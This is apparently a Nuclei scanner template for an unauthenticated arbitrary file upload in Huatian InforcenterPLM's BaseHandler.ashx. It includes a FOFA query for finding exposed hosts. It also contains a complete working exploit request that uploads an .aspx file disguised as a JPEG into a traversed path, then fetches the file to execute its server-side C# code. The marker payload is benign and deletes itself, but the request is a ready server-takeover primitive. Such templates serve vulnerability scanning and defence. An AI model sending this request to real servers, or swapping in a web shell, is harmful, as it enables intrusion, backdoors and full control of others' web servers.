http:
    - extractors:
        - group: 1
          internal: true
          name: uploadfile
          part: body
          regex:
            - ([a-zA-Z0-9-]+[-a-zA-Z0-9]+\.aspx)
          type: regex
        - group: 1
          internal: true
          name: time
          part: body
          regex:
            - (Files/+[0-9]+)
          type: regex
      raw:
        - |
          POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1
          Host: {{Hostname}}
          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTxlvAiDA82bSOF0h

          ------WebKitFormBoundaryTxlvAiDA82bSOF0h
          Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
          Content-Type: image/jpeg

          <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
          ------WebKitFormBoundaryTxlvAiDA82bSOF0h--
    - matchers:
        - part: body
          type: word
          words:
            - pboyjnnrfipmplsukdeczudsefxmywe
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /{{time}}/{{uploadfile}} HTTP/1.1
          Host: {{Hostname}}
id: huatian-InforcenterPLM-BaseHandler_ashx-File-upload
info:
    author: Superhero
    description: |-
        fofa: body="/Base/BaseHandler.ashx"
        华天InforcenterPLM BaseHandler.ashx 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
    name: 华天InforcenterPLM BaseHandler.ashx 任意文件上传漏洞
    reference:
        - https://mp.weixin.qq.com/s/MIvhNlQvjMd8dL2WpI9nzA
    severity: high
    tags: []
variables:
    username: '{{to_lower(rand_base(6))}}'
